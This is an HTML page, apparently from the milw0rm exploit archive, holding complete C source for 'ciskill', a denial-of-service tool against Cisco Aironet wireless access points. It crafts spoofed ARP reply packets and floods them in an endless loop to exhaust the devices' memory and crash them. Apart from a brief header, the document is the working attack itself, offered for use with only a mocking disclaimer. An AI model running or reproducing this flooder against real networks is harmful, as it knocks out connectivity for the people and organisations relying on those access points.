<html>
<head>
<title>Cisco Aironet Wireless Access Points Memory Exhaustion ARP Attack DoS</title>
<pre>
//
// Cisco Killer - ciskill.c
//
// Usage: ./ciskill [device]
//
// Author: Pasv (pasvninja [at] gmail.com)
//
// Credit: This exploit takes advantage of a vulnerability that was
// discovered by Eric Smith on January 12, 2006 (bid:16217)
//
// Greets to NW, zimmy, GSO, and the rest.
//
// Description: The vulnerability exists in the way the affected versions
// below handle ARP replies, if enough specially crafted ARP packets are sent
// on the network with the affected systems it will cause the access point memory
// exhaustion which will in a few seconds (depending on the speed of the attacker
// and the memory of the target) crash the system, making all ingoing/outgoing
// traffic stopped.
//
// Disclaimer: I pity the foo who uses this exploit for evil, I take no responsibility
// for your actions (like a knife maker).
//
// Versions affected:
//  Cisco Aironet 350 IOS
//  Cisco Aironet 1400
//  Cisco Aironet 1300
//  Cisco Aironet 1240AG
//  Cisco Aironet 1230AG
//  Cisco Aironet 1200
//  Cisco Aironet 1130AG
//  Cisco Aironet 1100
// (this includes most linksys wireless access points)



#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;net/if.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;linux/if_ether.h&gt;
#include &lt;linux/sockios.h&gt;

// Edit this packet accordingly if the target is picky
char pkt[]=
// Ethernet header
&quot;\xff\xff\xff\xff\xff\xff&quot; 	// Destination: broadcast
&quot;AAAAAA&quot;			// Source: 41:41:41:41:41:41
&quot;\x08\x06&quot;			// Pkt type: ARP
// ARP header
&quot;\x00\x01&quot;			// Hardware type: Ethernet
&quot;\x08\x00&quot;			// Protocol: IP
&quot;\x06&quot;				// Hardware size: 6
&quot;\x04&quot;				// Protocol size: 4
&quot;\x00\x02&quot;			// Opcode: Reply
&quot;AAAAAA&quot;			// Sender (Mac): 41:41:41:41:41:41
&quot;AAAA&quot;				// Sender (IP): 65.65.65.65
&quot;AAAAAA&quot;			// Target (mac): 41:41:41:41:41:41
&quot;AAAA&quot;				// Target (IP): 65.65.65.65
; // End of Packet

int main(int argc, char **argv) {
	FILE *fp;
	int sock, seed;
	long count;
	char *device;
	in_addr_t addr;
	struct sockaddr sin;
	
	printf(&quot;CisKill -- Aironet Cisco Killer\nCoded by: Pasv\nDiscovery credit: Eric Smith\n&quot;);
	if(getuid()) {
		printf(&quot;Must be root to inject arp packets!\n&quot;);
		exit(1);
	}
	
	if(argc != 2) {
		strcpy(device,&quot;wlan0&quot;);
	}
	else {
		device=argv[1];
	}

	fp = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);
	fscanf(fp,&quot;%d&quot;, &amp;seed);
	fclose(fp);
	srand(seed);
	
	memset(&amp;sin, 0, sizeof(sin));
	sin.sa_family = AF_UNSPEC;
	strncpy(sin.sa_data,device, 14);
	
	sock = socket(PF_INET, SOCK_PACKET, 0x300);
	
	printf(&quot;Using device: %s\n\n&quot;, device);	
	
	// stupid
	printf(&quot;Press ctrl+c immediately if you wish to stop\nGoing in 5\n&quot;);
	sleep(1);printf(&quot; 4\n&quot;);sleep(1);printf(&quot; 3\n&quot;);sleep(1);printf(&quot; 2\n&quot;);sleep(1);printf(&quot; 1!\n&quot;);sleep(1);
	
	while(1) {
		addr = (rand()%0xff)+(rand()%0xff)+(rand()%0xff)+(rand()%0xff);
		pkt[28] = (char)addr;
		pkt[38] = (char)addr;
		count++;
		printf(&quot;#:%ld bytes sent: %d (should be 42)\n&quot;,count,  sendto(sock, pkt, 42, 0, (struct sockaddr *)&amp;sin, sizeof(sin)));
	}
}

// milw0rm.com [2006-01-25]
</pre>
</html>

